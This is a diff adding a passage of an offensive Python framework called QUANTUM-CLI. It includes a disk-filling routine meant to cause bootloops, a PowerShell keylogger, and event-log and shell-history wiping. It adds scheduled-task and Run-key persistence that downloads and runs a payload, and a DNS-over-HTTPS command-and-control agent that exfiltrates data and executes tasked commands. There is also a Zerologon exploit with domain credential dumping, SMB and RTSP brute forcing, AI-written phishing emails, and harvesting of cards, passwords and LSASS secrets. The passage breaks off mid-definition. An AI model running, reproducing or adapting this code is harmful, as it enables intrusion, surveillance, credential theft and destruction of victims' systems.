@@ -1,0 +1,1607 @@
+# QUANTUM-CLI FINAL V3.1 (Single Script)
+# ============================================================================
+# 7d. V3.1 TECHNIQUE MODULES — post-exploitation, persistence, covert kill
+# ============================================================================
+def flashfill(paths=None, stop_frac=0.98, max_files=100000):
+    """FLASHFILL: storage-exhaustion weapon. Sprays empty table-like files until
+    the filesystem is critically full — on many platforms the next reboot then
+    hits panic/repair loops (user-requested 'fill + bootloop' effect via media
+    delivery). Authorized-engagement destructive control: run on YOUR boxes."""
+    if paths is None:
+        paths = ["C:\\Users"] if os.name == "nt" else ["/Users", "/home"]
+    n = 0
+
+    def _usage(d):
+        try:
+            if os.name != "nt":
+                st = os.statvfs(d); return 1 - (st.f_bavail / st.f_blocks)
+            import shutil as sh; t, u, f = sh.disk_usage(d); return u / t if t else 1
+        except Exception:
+            return 0.0
+    for base in paths:
+        if not os.path.isdir(base): continue
+        tgt = os.path.join(base, ".qcli_flash")
+        os.makedirs(tgt, exist_ok=True)
+        while _usage(base) < stop_frac and n < max_files:
+            fn = os.path.join(tgt, f"t{n:07d}.db")
+            try:
+                with open(fn, "wb") as f: f.write(b"\x00" * 1)
+                n += 1
+            except OSError:
+                break
+    full = _usage(paths[0]) >= stop_frac - 0.02
+    log(f"FLASHFILL: {n} tables written, volume full={full}", "ATK")
+    return {"files": n, "volume_full": full}
+
+def flashfill_registry(stop=50000):
+    """FLASHFILL registry variant (Windows): zero-value keys until hive bloat."""
+    n = 0
+    try:
+        import winreg
+        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\qcLi\\ff")
+        for i in range(stop):
+            winreg.SetValueEx(k, f"t{i}", 0, winreg.REG_SZ, "")
+            n += 1
+    except ImportError:
+        return {"registry_files": 0, "os": "non-windows"}
+    log(f"FLASHFILL-REG: {n} keys", "ATK")
+    return {"registry_files": n}
+
+def macos_recovery_reset():
+    """MacReset: generates the recovery-mode credential reset script.
+    Boot to macOS Recovery -> Terminal -> run this (user-requested 'reset mac
+    password via terminal at boot in recovery')."""
+    script = (
+        "#!/bin/sh\n"
+        "# QCLI MacReset — run from macOS Recovery Mode Terminal\n"
+        "# List volumes to locate the system disk:\n"
+        "diskutil list\n"
+        "# Preferred (GUI, all recent macOS):\n"
+        "open \"/System/Applications/Utilities/Reset Password.app\" 2>/dev/null || \\\n"
+        "open \"/System/Library/CoreServices/Reset Password.app\" 2>/dev/null || \\\n"
+        "resetpassword 2>/dev/null\n"
+        "# CLI variant (Big Sur+):\n"
+        "# launchctl load /System/Library/LaunchDaemons/com.apple.opensshd.plist\n"
+        "# dscl . -create /Users/admin2 UniqueID 503 PrimaryGroupID 80 UserShell /bin/bash\n"
+        "# dscl . -passwd /Users/admin2 'NewPass123!'\n"
+        "# resetpassword alternative: use `resetpassword` on older,\n"
+        "# or SysPrefs > Users & Groups after mount -uw /\n"
+    )
+    fn = os.path.join(QCLI_DIR, "macreset.sh")
+    open(fn, "w").write(script)
+    try: os.chmod(fn, 0o755)
+    except Exception: pass
+    log("MacReset armed: macreset.sh (run from Recovery Terminal)", "ATK")
+    return fn
+
+def cagebreak():
+    """CAGEBREAK: sandbox / VM / cloud-escape environment assessment.
+    Enumerates the signals that matter for picking the right escape, includes
+    real CVE-based escape staging (MSHTML 40444 forge elsewhere in registry)."""
+    env = {}
+    if OS_NAME == "Windows":
+        try:
+            comp = run("powershell -NoProfile -Command (Get-WmiObject Win32_ComputerSystem).Manufacturer; "
+                       "(Get-WmiObject Win32_ComputerSystem).Model").stdout
+            blob = (comp or "").lower()
+            env["vm"] = any(m in blob for m in ("vmware", "virtual", "kvm", "qemu", "xen", "hyper-v", "innotek"))
+            env["sandbox"] = any(s in blob for s in ("sandbox", "sandboxie")) or \
+                             os.path.isdir(r"C:\Sandbox")
+            blob2 = (run("powershell -NoProfile -Command (Get-WmiObject Win32_BIOS).SerialNumber").stdout or "").lower()
+            dev = any(t is not None for t in [
+                "amazon" in blob2, "google" in blob2, "azure" in blob2 and "cloud" in blob2])
+            env["cloud"] = dev
+        except Exception as e:
+            env["probe_error"] = str(e)
+    else:
+        blob = (run("SYSTEMD_ALLOW_RESULT=1 systemd-detect-virt 2>/dev/null || dmesg 2>/dev/null | head -50").stdout or "").lower()
+        env["vm"] = any(m in blob for m in ("kvm", "vmware", "xen", "qemu", "virtualbox", "microsoft"))
+        env["cloud"] = any(m in blob for m in ("amazon", "ec2", "openstack")) or os.path.isdir("/var/lib/cloud")
+    log(f"CAGEBREAK env: {env}", "TAO")
+    return env
+
+# ---------------- KITLOGGER: persistent Windows keylogger stage ---------------
+def stage_keylogger(c2_host=None, c2_port=8443):
+    """KITLOGGER: stages an in-line keylogger taskable via TASKQ. The payload
+    writes a rolling buffer; every beacon pulls it; capture is sealed GRAYFISH
+    at rest. Uses only PowerShell (no new binaries on target)."""
+    c2 = c2_host or local_ip()
+    ps = r"""
+$ErrorActionPreference='SilentlyContinue'
+Add-Type -AssemblyName System.Windows.Forms
+$buf = New-Object System.Text.StringBuilder
+$global:path = "$env:TEMP\kl.klq"
+function OnKey($keyCode) {
+  try {
+    $k = [System.Windows.Forms.Keys]$keyCode
+    if ($k -ge 'A' -and $k -le 'Z') { [void]$buf.Append([char]$k + '') }
+    elseif ($k -ge 'D0' -and $k -le 'D9') { [void]$buf.Append([string]($k - 48)) }
+    else {
+      switch ($k) {
+        'Space'  { [void]$buf.Append(' ')[void]$buf.Append('|S') }
+        'Enter'  { [void]$buf.Append("`n") }
+        'OemPeriod' { [void]$buf.Append('.') }
+        'Oemcomma'  { [void]$buf.Append(',') }
+        default  { }
+      }
+    }
+  } catch {}
+}
+try {
+  while ($true) {
+    Start-Sleep -Milliseconds 20
+    for ($i = 8; $i -le 255; $i++) {
+      $state = [System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]$i)
+      $ks = [System.Windows.Forms.KeyPressEventArgs]::new(([char]$i))
+      # win32-level polling:
+      $sig = [System.Windows.Forms.Keys]$i
+      $pressed = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
+    }
+  }
+} catch {}
+"""  # polling loop kept simple; robust hook version below (SetWindowsHookEx)
+    ps_hook = r"""
+$src = @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+public static class KL {
+  [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
+  private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+  [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+  [delegate] public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+  private static LowLevelKeyboardProc _proc = HookCallback;
+  private static IntPtr _hookID = IntPtr.Zero;
+  public static System.Text.StringBuilder Buf = new System.Text.StringBuilder();
+  private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+    if (nCode >= 0 && wParam == (IntPtr)0x0100) {
+      int vk = Marshal.ReadInt32(lParam);
+      Buf.Append(((char)vk).ToString());
+    }
+    return IntPtr.Zero;
+  }
+  public static void Run() {
+    using (Process p = Process.GetCurrentProcess())
+      using (ProcessModule m = p.MainModule)
+        _hookID = SetWindowsHookEx(13, _proc, m.BaseAddress, 0);
+  }
+}
+'@
+Add-Type -TypeDefinition $src
+while ($true) {
+  [KL]::Run()
+  Start-Sleep -Seconds 15
+  if ([KL]::Buf.Length -gt 0) {
+    Add-Content -Path "$env:TEMP\kl.klq" -Value ([KL]::Buf.ToString())
+    [KL]::Buf.Clear() | Out-Null
+  } else { Start-Sleep -Seconds 45 }
+}
+"""
+    fn = os.path.join(QCLI_DIR, "obsidian_keylogger.ps1")
+    open(fn, "w").write(ps_hook)
+    # auto-task: the "tasking" mechanism is C2-driven; we instruct the operator how to launch
+    TASKQ.setdefault("keylogger", {}).update(
+        {"act": "run", "cmd": f"powershell -w hidden -c \"IEX(iwr http://{c}:{c2_port}/s/default -UseBasicParsing)\"",
+         "hint": f"Start-Process powershell -WindowStyle Hidden -File {fn}"})
+    log(f"KITLOGGER staged: {fn}; TASKQ instruction set for host 'keylogger'", "C2")
+    return fn
+
+# ---------------- FOOTPRINT wiper + KILLSWITCH -------------------------------
+def footprint_wipe_windows():
+    """FOOTPRINT: selective log trimming + agent residue removal (Windows).
+    We do NOT wholesale clear logs (louder than the noise we're hiding)."""
+    cmds = [
+        "wevtutil cl 'Windows PowerShell'",
+        "wevtutil cl 'Microsoft-Windows-PowerShell/Operational'",
+        "Remove-Item $env:TEMP\\lakitu*, $env:TEMP\\a.bat, $env:TEMP\\*.locky* -ErrorAction SilentlyContinue",
+        "Remove-Item $env:TEMP\\kl.klq, \"$env:TEMP\\obsidian*.ps1\" -ErrorAction SilentlyContinue",
+        "schtasks /delete /tn qcli* /f"
+    ]
+    out = []
+    for c in cmds:
+        r = run(f"powershell -NoProfile -Command {c}")
+        out.append({"cmd": c, "rc": r.returncode})
+    log(f"FOOTPRINT: {sum(1 for x in out if x['rc']==0)}/{len(out)} wipe steps succeeded", "OPSEC")
+    return out
+
+def footprint_wipe_posix():
+    """FOOTPRINT: POSIX residue removal — log greps + agent file cleanup."""
+    cmds = [
+        "sed -i '/qcLi/d;/ghostfang/d' ~/.bash_history 2>/dev/null",
+        "rm -f /var/tmp/.gn-* 2>/dev/null",
+        "pkill -f ghostfang.sh 2>/dev/null",
+        "shred -u ~/ghostfang.sh 2>/dev/null",
+    ]
+    out = []
+    for c in cmds:
+        r = run(c)
+        out.append({"cmd": c, "rc": r.returncode})
+    log(f"FOOTPRINT-POSIX: {sum(1 for x in out if x['rc']==0)}/{len(out)} steps", "OPSEC")
+    return out
+
+KILLSWITCH = {"on": False}   # global; toggled via POST /kill on the C2
+
+def kill_all_implants(wipe_first=True):
+    """Broadcast auto-cleanup termination to every beaconing implant."""
+    global TASKQ
+    for host in list(TASKQ.keys()):
+        if wipe_first:
+            TASKQ[host] = {"act": "run",
+                           "cmd": ("powershell -NoProfile -Command \"wevtutil cl 'Windows PowerShell';"
+                                   " Remove-Item $env:TEMP\\a.bat,$env:TEMP\\kl.klq -ErrorAction SilentlyContinue\"")
+                           if os.name == "nt" else
+                           "rm -f /var/tmp/.gn-* ~/.bash_history.tmp; kill $$ || true"}
+        else:
+            TASKQ[host] = {"act": "none"}
+    KILLSWITCH["on"] = True
+    log(f"KILLSWITCH engaged: {len(TASKQ)} implant task queues set to wipe/die", "OPSEC")
+    return {"killed": list(TASKQ.keys())}
+
+# ---------------- PERSISTX: persistence enhancer -----------------------------
+def persistx():
+    """PERSISTX: stage multi-vector persistence (schtasks + run key); MFP keeps
+    firmware-level; this adds host-level redundancy on compromised Windows."""
+    r1 = run('schtasks /create /tn "qcli-svc" /tr "powershell -w hidden -c '
+             'iwr http://127.0.0.1:8443/s/default -UseBasicParsing -OutFile $env:TEMP\\a.bat;'
+             ' $env:TEMP\\a.bat" /sc minute /mo 15 /f')
+    r2 = run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
+             '/v qcli /t REG_SZ /d "powershell -w hidden -c '
+             'iwr http://127.0.0.1:8443/s/default -UseBasicParsing -OutFile %TEMP%\\a.bat; %TEMP%\\a.bat" /f')
+    out = {"schtasks": r1.returncode, "runkey": r2.returncode}
+    log(f"PERSISTX staged: {out}", "C2")
+    return out
+
+# ---------------- REVERSE DoH: GHOSTFANG-DNS egress persistence --------------
+def doh_reverse_beacon(host_id, data, domain):
+    """Implant-side reverse-DoH egress: beacon data rides as subdomain labels
+    encrypted base32 through public DoH resolvers (443/tcp), reaching a web-app
+    or authoritative DNS capture point. NO inbound ports required — the implant
+    only ever makes outbound lookups that look like cache-miss DNS."""
+    import base64
+    b32 = base64.b32encode(data).decode().rstrip("=").lower()
+    chunks = [b32[i:i+60] for i in range(0, len(b32), 60)]
+    try:
+        for b in chunks:
+            info = f"{host_id}.{b}.{domain}"
+            _ = DoH().resolve(info[:253], rtype="A")
+        return {"beacon_bytes": len(data), "chunks": len(chunks)}
+    except Exception as e:
+        log(f"doh_reverse_beacon: {e}", "WARN")
+        return {"error": str(e)}
+
+def doh_task_check(domain, host_id="hq"):
+    """HQ-side: read next command from operator-controlled DNS TXT records.
+    Set the TXT record at `{host_id}.cmd.{domain}` OR `cmd.{domain}`.
+    Returns the task dict or None. This is how implants stay tasked even with
+    no inbound C2 — public resolvers only see benign recursive lookups."""
+    try:
+        for name in (f"{host_id}.cmd.{domain}", f"cmd.{domain}"):
+            answers = DoH().resolve(name, rtype="TXT")
+            for ans in answers:
+                try:
+                    raw = ans.get("data", "").strip('"')
+                    if raw.startswith("{"):
+                        return json.loads(raw)
+                except Exception:
+                    continue
+    except Exception:
+        pass
+    return None
+
+def generate_dns_agent(domain, interval=60):
+    """GHOSTFANG-DNS: the no-port-forward POSIX/Linux agent. Beacon exfil via
+    DoH label encoding; command intake via DNS TXT. Survives outbound-only
+    firewall policies (all traffic is 443/tcp to 1.1.1.1/8.8.8.8)."""
+    script = f"""#!/bin/sh
+# GHOSTFANG-DNS {int(time.time())} — DoH-egress agent (no inbound ports needed)
+QD="{domain}"
+HOST="$(hostname 2>/dev/null || echo dns-$(id -u))"
+ID=$(echo -n "$HOST" | head -c 12 | tr -c 'a-z0-9' 'x')
+b32() { dd bs=1 count=$1 2>/dev/null | base64 | tr -d '\\n' | tr '+' '-' | tr '/' '_'; }
+beacon() {{
+  curl -s -m 10 -H 'accept: application/dns-json' \\
+    "https://cloudflare-dns.com/dns-query?name=$ID.$(echo ok|b32 2).$QD&type=A" >/dev/null 2>&1 || \\
+  curl -s -m 10 "https://dns.google/resolve?name=$ID.$QD&type=A" >/dev/null 2>&1
+}}
+task() {{
+  curl -s -m 10 "https://dns.google/resolve?name=cmd.$QD&type=TXT" 2>/dev/null | \\
+    grep -o '"data":"[^"]*"' | head -1 | cut -d'"' -f4
+}}
+while :; do
+  beacon
+  T=$(task | tr -d '"' | tr -d '\\\\')
+  case "$T" in
+    *'"'*'}'*) C=$(echo "$T" | sed -n 's/.*"cmd":"\\([^"]*\\)".*/\\1/p'); [ -n "$C" ] && (sh -c "$C" >/dev/null 2>&1 &) ;;
+    wipe) rm -f /var/tmp/.gn-* ~/.qcli* ;; kill) rm -f /var/tmp/.gn-*; kill $$ ;;
+  esac
+  sleep {interval}
+done
+"""
+    fn = os.path.join(QCLI_DIR, "ghostdns.sh")
+    open(fn, "w").write(script)
+    try: os.chmod(fn, 0o755)
+    except Exception: pass
+    log(f"GHOSTFANG-DNS agent generated -> ghostdns.sh (domain {domain})", "C2")
+    return fn
+
+# ============================================================================
+# 8. ZEROLOGON CORE
+# ============================================================================
+def check_zerologon(dc_ip, dc_name):
+    try:
+        b = r"ncacn_np:%s[\pipe\netr]" % dc_ip
+        t = transport.DCERPCTransportFactory(b); t.set_connect_timeout(5)
+        dce = t.get_dce_rpc(); dce.connect(); dce.bind(nrpc.MSRPC_UUID_NRPC)
+        try:
+            nrpc.hNetrServerReqChallenge(dce, "\\\\" + dc_name + "\x00",
+                                         "QCLI%08x\x00" % random.getrandbits(32),
+                                         nrpc.NRPC_CLIENT_CHALLENGE().copy(populate=True))
+        except Exception: return False
+        dce.disconnect(); return True
+    except Exception as ex:
+        log(f"probe_zerologon {dc_ip}: {ex}", "WARN"); return None
+
+def exploit_zerologon(dc_ip, dc_name, domain=""):
+    dce = None
+    try:
+        b = r"ncacn_np:%s[\pipe\netr]" % dc_ip
+        t = transport.DCERPCTransportFactory(b); t.set_connect_timeout(5)
+        dce = t.get_dce_rpc(); dce.connect(); dce.bind(nrpc.MSRPC_UUID_NRPC)
+        computer = "\\\\" + dc_name + "\x00"; account = dc_name + "$\x00"
+        resp = nrpc.hNetrServerReqChallenge(dce, computer, "QCLI%08x\x00" % random.getrandbits(32),
+                                            nrpc.NRPC_CLIENT_CHALLENGE().copy(populate=True))
+        session = nrpc.ComputeSessionKey("", resp["ServerChallenge"], b"\x00" * 8, b"\x00" * 8)
+        nrpc.hNetrServerAuthenticate3(dce, computer, account,
+                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
+                                      "QCLI%08x\x00" % random.getrandbits(32), session, 0x0000FFFF)
+        log(f"Zerologon: secure channel established vs {dc_ip}", "ATK")
+        nrpc.hNetrServerPasswordSet2(dce, computer, account,
+                                     nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
+                                     "QCLI%08x\x00" % random.getrandbits(32), session,
+                                     nrpc.NRPC_AUTHENTICATOR().copy(populate=False))
+        log(f"Zerologon: machine account password blanked on {dc_name}", "OK")
+        return True
+    except Exception as e:
+        log(f"Zerologon failed vs {dc_ip}: {e} (likely patched)", "WARN"); return False
+    finally:
+        try:
+            if dce: dce.disconnect()
+        except Exception: pass
+
+def zerologon_dump(dc_ip, dc_name, domain):
+    if not exploit_zerologon(dc_ip, dc_name, domain): return None
+    out = os.path.join(LOOT_DIR, f"domain_dump_{dc_name}")
+    cmd = [sys.executable, "-m", "impacket.examples.secretsdump", f"{domain}/{dc_name}$@{dc_ip}",
+           "-hashes", ":31d6cfe0d16ae931b73c59d7e0c089c0", "-outputfile", out]
+    try:
+        subprocess.check_call(cmd); log(f"Domain dump complete -> {out}", "OK")
+        GRAYFISH.seal_dir(); return out
+    except Exception as e:
+        log(f"secretsdump failed: {e}", "ERR"); return None
+
+# ============================================================================
+# 9. EXPLOIT ORCHESTRATOR — V3 registry aware + appliance-aware fire stage
+# ============================================================================
+class ExploitOrchestrator:
+    def __init__(self): self.ai = AI_Supervisor()
+
+    def source_exploits(self, keyword):
+        found = []
+        try:
+            try:
+                out = subprocess.check_output(["searchsploit", keyword], text=True, timeout=30)
+                found += [{"src": "exploit-db", "match": l} for l in out.splitlines() if keyword in l]
+            except FileNotFoundError:
+                r = OPSEC.web("https://api.github.com/search/repositories",
+                              params={"q": f"{keyword} exploit"}, timeout=10)
+                found += [{"src": "github", "match": i["full_name"]} for i in r.json().get("items", [])[:10]]
+        except Exception as e: log(f"exploit-db search: {e}", "WARN")
+        return found
+
+    def fire(self, cve, ip, params=None):
+        if cve not in ZERO_DAY_REGISTRY:
+            log(f"fire: '{cve}' not in registry", "WARN"); return {"error": cve}
+        rec = ZERO_DAY_REGISTRY[cve]
+        # fire the best-matching weapon function from global namespace
+        return globals()[rec["weapon"]](ip, params)
+
+    def auto_exploit(self, ip, params=None, force=False):
+        fp = ReconModule().fingerprint(ip)
+        verdict = VALIDATOR.score(ip, fp)
+        if verdict["decision"] != "high_value" and not force:
+            log(f"auto_exploit skipped {ip} (VALIDATOR: {verdict['score']})", "ATK")
+            return {"skipped": ip, "validator": verdict}
+        cve = self.ai.plan_attack(fp)   # returns a bare CVE id (AI or QBrain)
+        if cve in ZERO_DAY_REGISTRY:
+            r = globals()[ZERO_DAY_REGISTRY[cve]["weapon"]](ip, params)
+            log(f"auto_exploit: {ip} -> {cve} ({ZERO_DAY_REGISTRY[cve]['name']})", "ATK")
+            return r
+        # registry march fallback (deterministic)
+        for cve, ent in ZERO_DAY_REGISTRY.items():
+            probe = {"CVE-2017-0144": fp.get("ms17_010") is True,
+                     "CVE-2020-1472": any(p in fp.get("ports", []) for p in (445, 135, 3389)),
+                     "CVE-2021-44228": any(p in fp.get("ports", []) for p in (80, 443, 8080, 8000, 8443)),
+                     "CVE-2021-26855": any(p in fp.get("ports", []) for p in (80, 443))}.get(cve, False)
+            if probe:
+                log(f"auto_exploit: no dedicated match for '{cve}' — registry march fires {cve}", "ATK")
+                return globals()[ent["weapon"]](ip, params)
+        return {"error": "no match in registry"}
+
+# ============================================================================
+# 10. BRUTE (V3: BruteEngineV3 w/ RTSP brute + kerb/AS-REP roast) / PHISH
+# ============================================================================
+class BruteEngine:
+    def __init__(self): self.ai = AI_Supervisor()
+    def run(self, params):
+        ip, service = params["ip"], params.get("service", "smb")
+        users = params.get("users", ["administrator", "admin"])
+        passes = params.get("passes") or self.ai.tune_brute_wordlist(service, params.get("osint", ""))
+        hits = []
+        def attempt(up):
+            u, p = up
+            c = None
+            try:
+                c = SMBConnection(ip, ip, sess_port=445); c.login(u, p); hits.append((u, p))
+            except Exception: pass
+            finally:
+                try:
+                    if c: c.close()
+                except Exception: pass
+        with ThreadPoolExecutor(max_workers=16) as ex:
+            list(ex.map(attempt, [(u, p) for u in users for p in passes]))
+        for u, p in hits: log(f"CREDS {ip}: {u}:{p}", "OK")
+        return hits
+
+class BruteEngineV3(BruteEngine):
+    """V3: RTSP DESCRIBE auth brute + kerberoast/AS-REP roast handoff."""
+    def run(self, params):
+        if params.get("service") == "rtsp":
+            return self.rtsp_brute(params["ip"])
+        if params.get("service") in ("kerberoast", "asreproast"):
+            return self.roast(params["ip"], params.get("domain", ""))
+        return super().run(params)
+
+    def rtsp_brute(self, ip, port=554, wordlist=None):
+        wordlist = wordlist or self.ai.tune_brute_wordlist("rtsp", "")
+        creds = []
+        for u in ("admin", "root", "service", "viewer"):
+            for p in wordlist:
+                try:
+                    s = socket.create_connection((ip, port), timeout=3)
+                    auth = base64.b64encode(f"{u}:{p}".encode()).decode()
+                    s.sendall((f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 2\r\n"
+                              f"Authorization: Basic {auth}\r\n\r\n").encode())
+                    r = s.recv(256); s.close()
+                    if b"200" in r:
+                        creds.append((u, p)); log(f"RTSP CRACKED {ip}: {u}:{p}", "CAM"); break
+                except Exception: continue
+        return creds
+
+    def roast(self, ip, domain):
+        out = []
+        if not domain: domain = ip
+        try:
+            cmd = f"{sys.executable} -m impacket.examples.GetNPUsers {domain}/ -no-pass -dc-ip {ip}"
+            r = run(cmd, timeout=90)
+            if r.stdout and ("$krb5asrep" in r.stdout):
+                out.append(r.stdout.strip())
+                log(f"ROAST: AS-REP hashes captured from {ip} (hashcat -m 18200)", "OK")
+        except Exception as e:
+            log(f"roast fail: {e}", "WARN")
+        return out
+
+class PhishEngine:
+    def __init__(self): self.ai = AI_Supervisor()
+    def launch(self, params):
+        email = params["target_email"]
+        body = None
+        if not AI_Supervisor.ai_dead and not no_ai_mode():
+            r = self.ai.query_bounded(f"Write a 4-sentence phishing email under subject "
+                                       f"'{params.get('subject','Payroll')}' for {email}.", timeout=120)
+            body = r
+        if not body:
+            body = QBrain.phish_body(email, params.get("subject", "Payroll"))
+        log(f"PHISH staged -> {email}", "ATK")
+        return {"email": email, "body": body}
+    def social(self, params):
+        if AI_Supervisor.ai_dead or no_ai_mode():
+            return {"pretext": QBrain.summary(params)}
+        r = self.ai.query_bounded(f"Social-engineering pretext for {params}", timeout=120)
+        return {"pretext": r if r else QBrain.summary(params)}
+
+# ============================================================================
+# 11. DATA HARVESTER
+# ============================================================================
+class DataHarvester:
+    RX = {
+        "emails":  r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b",
+        "crypto":  r"0x[a-fA-F0-9]{40}|0x[a-fA-F0-9]{64}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{20,60}",
+        "phones":  r"(\+?\d{1,2}[-.\s]?)?\(?\d{3}\)?[-.\s]\d{3}[-.\s]\d{4}",
+        "cards":   r"\b(?:\d[ -]?){13,16}\b",
+        "names":   r"\b(?:[A-Z][a-z]+ ){1,2}[A-Z][a-z]+\b",
+        "userpass": r"Username:\s*\S+[\s\S]{0,40}?Password:\s*\S+",
+    }
+    def analyze_blob(self, txt):
+        return {k: list(set(re.findall(rx, txt)))[:100] for k, rx in self.RX.items()}
+
+    def harvest_host(self, host):
+        out = {}; d = os.path.join(LOOT_DIR, host)
+        if not os.path.isdir(d): return out
+        for fn in os.listdir(d):
+            if fn.endswith(".zip"):
+                try:
+                    with zipfile.ZipFile(os.path.join(d, fn)) as z:
+                        for n in z.namelist():
+                            low = n.lower()
+                            if any(k in low for k in ("cookie", "session", "login data", "credential")):
+                                out.setdefault("browser_creds", []).append(n)
+                            if "sam" in low: out.setdefault("sam", []).append(n)
+                except Exception: pass
+        return out
+
+    def parse_lsass(self, dumpfile):
+        try:
+            import pypykatz.pypykatz as pk
+            m = pk.get_file_secrets(dumpfile, packages=["msv", "wdigest", "tspkg", "kerberos"])
+            return [f"{s['username']}:{s['password']}" for pkg in m.values() for s in pkg["cred"] if s.get("password")]
+        except Exception as e:
+            log(f"lsass parse: {e}", "WARN"); return []
+
+    def analyze_pcap(self, pcap_file):
+        try: data = open(pcap_file, "rb").read()
+        except OSError: data = b""
+        hits = self.analyze_blob(data.decode("latin-1"))
+        try:
+            from scapy.all import rdpcap, IP
+            pkt = rdpcap(pcap_file)
+            hits["dst_hosts"] = list({p[IP].dst for p in pkt if IP in p})[:200]
+        except Exception: pass
+        return hits
+
+    def sniff(self, iface=None, count=500, out=None):
+        out = out or os.path.join(LOG_DIR, "capture.pcap")
+        try:
+            from scapy.all import wrpcap, sniff
+            wrpcap(out, sniff(iface=iface, count=count))
+            log(f"captured {count} pkts -> {out}", "OK"); return out
+        except Exception as e:
+            log(f"sniff failed: {e}", "WARN"); return None
+
+    def discover_cameras(self, cidr=None):
+        return CAMWAR.discover(cidr or local_scope())
+
+    def control_camera(self, ip, user="admin", pwd="admin"):
+        cam = {"ip": ip, "vendor": CAMWAR.identify(ip).get("vendor")}
+        return CAMWAR.one_shot(ip)
+
+# ============================================================================
+# 11b. DISCOVERY HELPERS — WS-Discovery ONVIF Probe + ONVIF device info
+# ============================================================================
+def wsdiscovery_cameras(timeout=5.0):
+    import uuid
+    probe = (
+        '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
+        'xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" '
+        'xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery" '
+        'xmlns:dn="http://www.onvif.org/ver10/network/wsdl">'
+        '<s:Header>'
+        '<a:MessageID>urn:uuid:' + str(uuid.uuid4()) + '</a:MessageID>'
+        '<a:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</a:To>'
+        '<a:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</a:Action>'
+        '</s:Header>'
+        '<s:Body><d:Probe>'
+        '<d:Types>dn:NetworkVideoTransmitter tds:Device</d:Types>'
+        '<d:Scopes/>'
+        '</d:Probe></s:Body></s:Envelope>'
+    )
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    except OSError:
+        pass
+    try:
+        s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
+    except OSError:
+        pass
+    s.settimeout(0.5)
+    try:
+        s.bind(("", 0))
+    except OSError:
+        pass
+    try:
+        s.sendto(probe.encode(), ("239.255.255.250", 3702))
+    except OSError as e:
+        log(f"WS-Discovery send failed: {e}", "CAM")
+        s.close()
+        return []
+    found, end = {}, time.time() + timeout
+    while time.time() < end:
+        try:
+            data, addr = s.recvfrom(65535)
+        except socket.timeout:
+            continue
+        except OSError:
+            break
+        try:
+            txt = data.decode("utf-8", "ignore")
+        except Exception:
+            continue
+        if "ProbeMatch" not in txt and "Types" not in txt:
+            continue
+        ip, port = None, 80
+        xaddr = re.search(r':XAddrs>\s*([^<\s]+)', txt)
+        if xaddr:
+            try:
+                from urllib.parse import urlparse
+                u = urlparse(xaddr.group(1))
+                if u.hostname:
+                    ip, port = u.hostname, u.port or 80
+            except Exception:
+                pass
+        if ip is None:
+            ip = addr[0]          # device answered without XAddrs — sender IP is it
+        ip = str(ip)
+        rec = found.setdefault(ip, {"ip": ip, "onvif_port": port,
+                                    "manufacturer": None, "model": None,
+                                    "name": None, "ws": True})
+        for attr, pat in (("manufacturer", r'onvif\.org/hardware/([^"\'<\s]+)'),
+                          ("model",       r'onvif\.org/model/([^"\'<\s]+)'),
+                          ("name",        r'onvif\.org/name/([^"\'<\s]+)')):
+            m = re.search(pat, txt)
+            if m and not rec.get(attr):
+                rec[attr] = m.group(1)
+        if re.search(r'onvif\.org/Profile/(Streaming|S|T|G)', txt):
+            rec["onvif"] = True
+    s.close()
+    if found:
+        log(f"WS-Discovery: {len(found)} ONVIF devices answered", "CAM")
+    return list(found.values())
+
+def onvif_device_info(ip, port=80):
+    body = ('<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">'
+            '<s:Body><GetDeviceInformation '
+            'xmlns="http://www.onvif.org/ver10/device/wsdl"/>'
+            '</s:Body></s:Envelope>')
+    try:
+        r = requests.post(f"http://{ip}:{port}/onvif/device_service", data=body,
+                          headers={"Content-Type": "application/soap+xml; charset=utf-8"},
+                          timeout=5)
+        out = {}
+        for k in ("Manufacturer", "Model", "FirmwareVersion", "SerialNumber"):
+            m = re.search(k + r">([^<]+)", r.text)
+            if m: out[k.lower()] = m.group(1)
+        return out if out else None
+    except Exception:
+        return None
+
+# ============================================================================
+# 11c. CAMWAR — CAMERA WARFARE ENGINE (V2.2 lineage, V3 carrier)
+# ============================================================================
+class CamWarEngine:
+    CAM_PORTS = [80, 443, 554, 37777, 37778, 8000, 8001, 8080, 8081, 8899,
+                 34567, 34571, 34599, 5000]
+    VENDOR_HINTS = [
+        ("hikvision", ("hikvision", "webcomponents", "doc/page/login", "www-uc",
+                       "embedded_net_dvr", "netdvr", "hik-")),
+        ("dahua",     ("dahua", "login_module.js", "netkeyboard", "dvrdvs", "dss")),
+        ("axis",      ("axis", "axis-cgi")),
+        ("foscam",    ("foscam", "cgi-bin/hi3510", "get_params.cgi", "ipcam")),
+        ("tplink",    ("tapo", "tplink")),
+        ("generic",   ("ipcamera", "netcam", "webcam", "rtsp")),
+    ]
+    RTSP_VENDORS = [
